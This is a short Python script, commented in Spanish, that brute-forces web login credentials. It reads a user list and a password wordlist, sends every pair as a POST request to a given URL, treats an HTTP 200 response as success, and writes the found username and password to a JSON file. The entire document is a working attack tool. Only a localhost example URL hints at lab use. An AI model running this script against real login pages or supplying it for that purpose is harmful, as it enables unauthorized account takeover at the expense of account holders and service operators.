import requests
import argparse
import json


parser = argparse.ArgumentParser(description="Bruteforcer de passwords")
parser.add_argument("-U", "--username", required=True, help="Archivo de usuarios")
parser.add_argument("-u", "--url", required=True, help="URL base (ej: http://127.0.0.1:5000)")
parser.add_argument("-w", "--wordlist", required=True, help="Ruta a la wordlist")
args = parser.parse_args()
url = args.url #definimos url

with open(args.wordlist, "r") as f: #leemos el archivo
    palabras = [linea.strip() for linea in f]

with open(args.username,"r") as usuarios:
    palabras1 = [linea.strip() for linea in usuarios]

print (f"\n[*] Iniciando brute force en {url}\n")

password_encontrada = None

for usuario in palabras1:
    for password in palabras:
        r = requests.post(url, data={"username": usuario, "password": password})

        if r.status_code == 200:
            password_encontrada = password
            print(f"[+] CREDENCIALES ENCONTRADAS -> {usuario}:{password}")
            break
    if password_encontrada:
        break

if password_encontrada:
    output = {
        "url": args.url,
        "usuario": usuario,
        "password_encontrada": password_encontrada
    }
    with open("passwd_crack.json", "w", encoding="utf-8") as f:
        json.dump(output, f, indent=4)
    print(f"\n[*] Resultado guardado en passwd_crack.json")
else:
    print("\n[-] Password no encontrada en la wordlist")
